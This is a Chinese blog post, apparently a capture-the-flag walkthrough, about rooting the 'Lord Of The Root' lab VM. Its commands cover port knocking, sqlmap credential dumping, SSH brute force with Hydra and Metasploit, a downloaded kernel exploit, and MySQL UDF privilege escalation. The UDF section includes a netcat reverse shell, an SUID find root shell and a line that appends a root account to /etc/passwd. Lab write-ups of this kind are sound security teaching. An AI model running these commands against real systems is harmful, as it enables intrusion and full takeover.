@@ -1,0 +1,417 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Lord Of The Root-1.0.1 | 0000FF's Blog</title><meta name="author" content="0000FF"><meta name="copyright" content="0000FF"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1、查询靶场IP：1nmap -sP 10.211.55.0&#x2F;24  Nmap scan report for localhost (10.211.55.11) 2、nmap -p- 10.211.55.11仅仅开放了22端口！ 3、ssh尝试登录1ssh 10.211.55.11  填写yes发现信息：Easy as 1,2,3意思是让敲震端口3次！ 4、端口碰撞端口试探（port knocki">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lord Of The Root-1.0.1">
+<meta property="og:url" content="https://chr1sto4f.github.io/2023/01/26/Lord-Of-The-Root-1-0-1/index.html">
+<meta property="og:site_name" content="0000FF&#39;s Blog">
+<meta property="og:description" content="1、查询靶场IP：1nmap -sP 10.211.55.0&#x2F;24  Nmap scan report for localhost (10.211.55.11) 2、nmap -p- 10.211.55.11仅仅开放了22端口！ 3、ssh尝试登录1ssh 10.211.55.11  填写yes发现信息：Easy as 1,2,3意思是让敲震端口3次！ 4、端口碰撞端口试探（port knocki">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/9e759a9e6d036079ae79df3d8c914976.jpeg">
+<meta property="article:published_time" content="2023-01-26T09:58:02.000Z">
+<meta property="article:modified_time" content="2023-01-26T10:05:55.365Z">
+<meta property="article:author" content="0000FF">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/9e759a9e6d036079ae79df3d8c914976.jpeg"><link rel="shortcut icon" href="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg"><link rel="canonical" href="https://chr1sto4f.github.io/2023/01/26/Lord-Of-The-Root-1-0-1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Lord Of The Root-1.0.1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-01-26 18:05:55'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/9e759a9e6d036079ae79df3d8c914976.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">0000FF's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Lord Of The Root-1.0.1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-26T09:58:02.000Z" title="发表于 2023-01-26 17:58:02">2023-01-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-26T10:05:55.365Z" title="更新于 2023-01-26 18:05:55">2023-01-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Lord Of The Root-1.0.1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="1、查询靶场IP："><a href="#1、查询靶场IP：" class="headerlink" title="1、查询靶场IP："></a>1、查询靶场IP：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 10.211.55.0/24</span><br></pre></td></tr></table></figure>
+
+<p>Nmap scan report for localhost (10.211.55.11)</p>
+<h3 id="2、nmap-p-10-211-55-11"><a href="#2、nmap-p-10-211-55-11" class="headerlink" title="2、nmap -p- 10.211.55.11"></a>2、nmap -p- 10.211.55.11</h3><p>仅仅开放了22端口！</p>
+<h3 id="3、ssh尝试登录"><a href="#3、ssh尝试登录" class="headerlink" title="3、ssh尝试登录"></a>3、ssh尝试登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 10.211.55.11</span><br></pre></td></tr></table></figure>
+
+<p>填写yes发现信息：Easy as 1,2,3<br>意思是让敲震端口3次！</p>
+<h3 id="4、端口碰撞"><a href="#4、端口碰撞" class="headerlink" title="4、端口碰撞"></a>4、端口碰撞</h3><p>端口试探（port knocking）是一种通过连接尝试，从外部打开原先关闭端口的方法。一旦收到正确顺序的连接尝试，防火墙就会动态打开一些特定的端口给允许尝试连接的主机。</p>
+<p>端口试探的主要目的是防治攻击者通过端口扫描的方式对主机进行攻击。端口试探类似于一次秘密握手协议，比如一种最基本的方式：发送一定序列的UDP、TCP数据包。当运行在主机上的daemon程序捕捉到数据包以后，如果这个序列正确，则开启相应的端口，或者防火墙允许客户端通过。</p>
+<p>由于对外的Linux服务器通过限制IP地址的方式来控制访问，因此可以利用这种端口试探方式来进行防火墙对于访问IP地址的控制。</p>
+<p>如何进行端口碰撞？</p>
+<p>首先需要我们知道端口碰撞的序列，否则暴力碰撞开启的机会太小。</p>
+<p>1）第一种方法：knock 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux安装：sudo apt install knockd</span><br></pre></td></tr></table></figure>
+
+<p>使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">knock &lt;IP&gt; &lt;PORT1&gt; &lt;PORT2&gt; &lt;PORT3&gt; &lt;PORT4&gt; -v</span><br></pre></td></tr></table></figure>
+
+<p>例如需要碰撞 172.16.1.1 的 3，4，7，8 端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">knock 10.211.55.11 1 2 3 -v</span><br></pre></td></tr></table></figure>
+
+<p>2）hping3：TCP&#x2F;IP数据包组装&#x2F;分析工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hping3 -S [IP地址] -p 1 -c 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hping3 -S 10.211.55.11 -p 1 -c 1</span><br><span class="line">hping3 -S 10.211.55.11 -p 2 -c 1</span><br><span class="line"></span><br><span class="line">hping3 -S 10.211.55.11 -p 3 -c 1</span><br></pre></td></tr></table></figure>
+
+<p>-S（–syn）：SYN是TCP&#x2F;IP建立连接时使用的握手信号。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个SYN消息，服务器使用SYN-ACK应答表示接收到了这个消息，最后客户机再以ACK消息响应。这样在客户机和服务器之间才能建立起可靠的TCP连接，数据才可以在客户机和服务器之间传递。<br>-p –destport： 目的端口（默认为0），可同时指定多个端口<br>-c –count：指定数据包的次数</p>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_30247635/article/details/86243448">https://blog.csdn.net/qq_30247635/article/details/86243448</a></p>
+<p>敲震三次后：<br>nmap全端口查看情况！nmap -p- 10.211.55.11<br>PORT     STATE SERVICE<br>22&#x2F;tcp   open  ssh<br>1337&#x2F;tcp open  waste</p>
+<h3 id="5、信息枚举：http-10-211-55-11-1337"><a href="#5、信息枚举：http-10-211-55-11-1337" class="headerlink" title="5、信息枚举：http://10.211.55.11:1337/"></a>5、信息枚举：<a target="_blank" rel="noopener" href="http://10.211.55.11:1337/">http://10.211.55.11:1337/</a></h3><p>枚举到存在：<br><a target="_blank" rel="noopener" href="http://10.211.55.11:1337/robots.txt">http://10.211.55.11:1337/robots.txt</a><br>在F12调试界面发现：</p>
+<p>THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh</p>
+<p>在kali通过base64转码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&#x27; | base64 -d</span><br></pre></td></tr></table></figure>
+
+<p>Lzk3ODM0NTIxMC9pbmRleC5waHA&#x3D; Closer!</p>
+<p>发现还是base64继续转码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;Lzk3ODM0NTIxMC9pbmRleC5waHA=&#x27; | base64 -d                    </span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;978345210&#x2F;index.php<br>发现目录！</p>
+<h3 id="6、SQLmap注入"><a href="#6、SQLmap注入" class="headerlink" title="6、SQLmap注入"></a>6、SQLmap注入</h3><p>信息枚举：<a target="_blank" rel="noopener" href="http://10.211.55.11:1337/978345210/index.php">http://10.211.55.11:1337/978345210/index.php</a><br>发现：Welcome to the Gates of Mordor</p>
+<p>1）爆破数据库库信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -o -u &quot;http://10.211.55.11:1337/978345210/index.php&quot; --forms --dbs</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>Optimization<br>-o：开启所有优化开关<br>–predict-output：预测常见的查询输出<br>–keep-alive：使用持久的HTTP(S)连接<br>–null-connection：从没有实际的HTTP响应体中检索页面长度</p>
+<p>–threads&#x3D;THREADS：设置请求的并发数</p>
+<p>–forms参数，sqlmap会自动从-u中的url获取页面中的表单进行测试</p>
+<p>available databases [4]:<br>[<em>] information_schema<br>[</em>] mysql<br>[<em>] performance_schema<br>[</em>] Webapp<br>爆破出了数据库四个！继续获取webapp数据表信息！</p>
+<p>2）爆破数据库表信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -o -u &quot;http://10.211.55.11:1337/978345210/index.php&quot; --forms -D Webapp --tables</span><br></pre></td></tr></table></figure>
+
+<p>Database: Webapp<br>[1 table]<br>+——-+<br>| Users |<br>+——-+<br>可以看到Users数据表，继续查看数据表信息！</p>
+<p>3）爆破数据库表字段信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -o -u &quot;http://10.211.55.11:1337/978345210/index.php&quot; --forms -D Webapp -T Users --columns</span><br></pre></td></tr></table></figure>
+
+<p>(-D dbname指定数据库名称、-T tablename：指定某数据表的名称、–columns：列出指定表上的所有列)</p>
+<p>Database: Webapp<br>Table: Users<br>[3 columns]<br>+———-+————–+<br>| Column   | Type         |<br>+———-+————–+<br>| id       | int(10)      |<br>| password | varchar(255) |<br>| username | varchar(255) |<br>+———-+————–+<br>可看到数据库Webapp的表Users中存在字段id,password,username信息！</p>
+<p>4）爆破字段内容信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -o -u &quot;http://10.211.55.11:1337/978345210/index.php&quot; --forms -D Webapp -T Users --columns -C id,username,password --dump</span><br></pre></td></tr></table></figure>
+
+<p>(-D dbname:指定数据库名称、-T tablename:指定某数据表名称、-C Cnmme:指定列名、–dump:导出列里面的字段)</p>
+<p>Database: Webapp<br>Table: Users<br>[5 entries]<br>+—-+———-+——————+<br>| id | username | password         |<br>+—-+———-+——————+<br>| 1  | frodo    | iwilltakethering |<br>| 2  | smeagol  | MyPreciousR00t   |<br>| 3  | aragorn  | AndMySword       |<br>| 4  | legolas  | AndMyBow         |<br>| 5  | gimli    | AndMyAxe         |<br>+—-+———-+——————+<br>获得用户名密码，那么来爆破下！<br>user：<br>frodo<br>smeagol<br>aragorn<br>legolas<br>gimli</p>
+<p>passwd：<br>iwilltakethering<br>MyPreciousR00t<br>AndMySword<br>AndMyBow<br>AndMyAxe</p>
+<h3 id="7、SSH爆破-MSF、Hydra"><a href="#7、SSH爆破-MSF、Hydra" class="headerlink" title="7、SSH爆破-MSF、Hydra"></a>7、SSH爆破-MSF、Hydra</h3><p>1）Hydra爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt 10.211.55.11 ssh</span><br></pre></td></tr></table></figure>
+
+<p>[22][ssh] host: 10.211.55.11   login: smeagol   password: MyPreciousR00t</p>
+<p>2）MSF爆破ssh</p>
+<p>若有用户名和密码字典的话，使用auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login模块</p>
+<p>若不知道，使用auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_enumusers模块先探测用户名是否存在</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/huweiliyi/article/details/105590291">https://blog.csdn.net/huweiliyi/article/details/105590291</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ssh_login</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set rhosts 10.211.55.11</span><br><span class="line">set user_file /root/桌面/lord/user.txt</span><br><span class="line">set pass_file /root/桌面/lord/pass.txt</span><br><span class="line">set stop_on_success true</span><br></pre></td></tr></table></figure>
+
+<p>Success: ‘smeagol:MyPreciousR00t’<br>用户名：smeagol<br>密码：MyPreciousR00t</p>
+<h3 id="8、SSH登录提权"><a href="#8、SSH登录提权" class="headerlink" title="8、SSH登录提权"></a>8、SSH登录提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh smeagol@10.211.55.11</span><br></pre></td></tr></table></figure>
+
+<p>MyPreciousR00t</p>
+<h3 id="9、EXP内核提权"><a href="#9、EXP内核提权" class="headerlink" title="9、EXP内核提权"></a>9、EXP内核提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
+
+<p>No LSB modules are available.<br>Distributor ID:	Ubuntu<br>Description:	Ubuntu 14.04.3 LTS<br>Release:	14.04</p>
+<p>Codename:	trusty</p>
+<p>谷歌搜索：Ubuntu 14.04 exploit<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39166">https://www.exploit-db.com/exploits/39166</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 39166</span><br><span class="line">locate linux/local/39166.c</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/39166.c /root/桌面/lord</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 8081</span><br><span class="line">wget http://10.211.55.19:8081/39166.c</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gcc 39166.c -o ff</span><br><span class="line">chmod +x ff</span><br><span class="line">./ff</span><br><span class="line">cd /root</span><br><span class="line">cat Flag.txt</span><br><span class="line"></span><br><span class="line">“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”</span><br><span class="line">– Gandalf</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="10、Mysql-UDF提权"><a href="#10、Mysql-UDF提权" class="headerlink" title="10、Mysql UDF提权"></a>10、Mysql UDF提权</h3><p>UDF提权先查看mysql版本！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep mysql   --查看历史安装包版本</span><br></pre></td></tr></table></figure>
+
+<p>5.5.44</p>
+<p>查看mysql运行权限是不是root！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep root   ---查看mysql进程信息</span><br></pre></td></tr></table></figure>
+
+<p>在寻找mysql账号密码！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name login.*</span><br></pre></td></tr></table></figure>
+
+<p>发现信息：&#x2F;var&#x2F;www&#x2F;978345210&#x2F;login.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;password&quot; -rn </span><br></pre></td></tr></table></figure>
+
+<p>存在password信息：new mysqli(‘localhost’, ‘root’, ‘darkshadow’, ‘Webapp’);</p>
+<p>获得mysql密码：<br>darkshadow</p>
+<p>登录mysql：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pdarkshadow</span><br></pre></td></tr></table></figure>
+
+<p>首先看一下是否满足写入条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;secure%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>是可以进行UDF提权的！</p>
+<p>查看插件目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>插件目录在：&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;</p>
+<p>查看能否远程登陆：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">select user,host from user;</span><br></pre></td></tr></table></figure>
+
+<p>只能本地登录！</p>
+<p>MySQL中，BLOB是一个二进制大型对象，是一个可以存储大量数据的容器，它能容纳不同大小的数据。BLOB类型实际是个类型系列（TinyBlob、Blob、MediumBlob、LongBlob），除了在存储的最大信息量上不同外，他们是等同的。</p>
+<p>MySQL的四种BLOB类型：<br>类型           大小(单位：字节)<br>TinyBlob      最大 255<br>Blob          最大 65K<br>MediumBlob    最大 16M<br>LongBlob      最大 4G </p>
+<p>可以利用lib_mysqludf_sys提供的函数执行系统命令，lib_mysqludf_sys：<br>sys_eval，执行任意命令，并将输出返回<br>sys_exec，执行任意命令，并将退出码返回。<br>sys_get，获取一个环境变量。<br>sys_set，创建或修改一个环境变量。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so .</span><br><span class="line">mv lib_mysqludf_sys_32.so ff.so</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql -uroot -pdarkshadow</span><br><span class="line">use mysql</span><br><span class="line">create table ff(ff longblob);</span><br><span class="line">insert into ff values (load_file(&#x27;/tmp/ff.so&#x27;));</span><br><span class="line">select * from ff into dumpfile &#x27;/usr/lib/mysql/plugin/ff.so&#x27;;</span><br><span class="line">create function sys_exec returns string soname &#x27;ff.so&#x27;;</span><br><span class="line">select * from mysql.func;</span><br><span class="line">select sys_exec(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"></span><br><span class="line">find / -exec &#x27;/bin/sh&#x27; \;</span><br></pre></td></tr></table></figure>
+
+<p>拓展知识点：或者利用sys_exec、sys_eval</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_exec(&#x27;nc -nv 10.211.55.19 6677 -e /bin/bash&#x27;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd ff1</span><br></pre></td></tr></table></figure>
+
+<p>YpIR51FecR9AY<br>select sys_exec(‘echo “ff1:Ef8ipBmhp5pnE:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash” &gt;&gt; &#x2F;etc&#x2F;passwd’);</p>
+<hr>
+<h3 id="11、缓冲区溢出漏洞"><a href="#11、缓冲区溢出漏洞" class="headerlink" title="11、缓冲区溢出漏洞"></a>11、缓冲区溢出漏洞</h3><p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。<br>ESP就是前面说的，始终指向栈顶，只要ESP指向变了，那么当前栈顶就变了。</p>
+<p>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。<br>EBP存储着当前函数栈底的地址，栈底通常作为基址，我们可以通过栈底地址和偏移相加减来获取变量地址（很重要）。</p>
+<p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。<br>EIP存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。<br>可以说如果控制了EIP寄存器的内容，就控制了进程——我们让EIP指向哪里，CPU就会去执行哪里的指令。</p>
+<p>查看SUID弱点值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>file命令比较每个文件的哈希值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file /SECRET/door1/file /SECRET/door2/file /SECRET/door3/file</span><br></pre></td></tr></table></figure>
+
+<p>或者使用du -b查看字节：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -b /SECRET/door1/file /SECRET/door2/file /SECRET/door3/file</span><br></pre></td></tr></table></figure>
+
+<p>7370	&#x2F;SECRET&#x2F;door1&#x2F;file<br>5150	&#x2F;SECRET&#x2F;door2&#x2F;file<br>7370	&#x2F;SECRET&#x2F;door3&#x2F;file</p>
+<p>或者使用ls -lahR比较创建的文件大小&#x2F;日期：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /SECRET/</span><br><span class="line"></span><br><span class="line">ls -lahR</span><br></pre></td></tr></table></figure>
+
+<p>使用python命令快速模糊判断多少个字符会导致程序崩溃。Python有-c参数，允许代码直接从shell执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./file $(python -c &#x27;print &quot;A&quot; * 200&#x27;)</span><br><span class="line">Illegal instruction (core dumped)</span><br></pre></td></tr></table></figure>
+
+<p>发现存在溢出值，需要把文件拷贝出来进行本地分析！</p>
+<p>base64文件拷贝：<br>base64 file    —-将file二进制文件转换base<br>然后复制到文本中：base64.txt<br>cat base64.txt | base64 -d &gt; file   —将文本文件转换回可执行文件<br>检查MD5和sha1值：<br>file file<br>md5sum file</p>
+<p>这时候就讲文件拷贝到kali本地进行分析。</p>
+<hr>
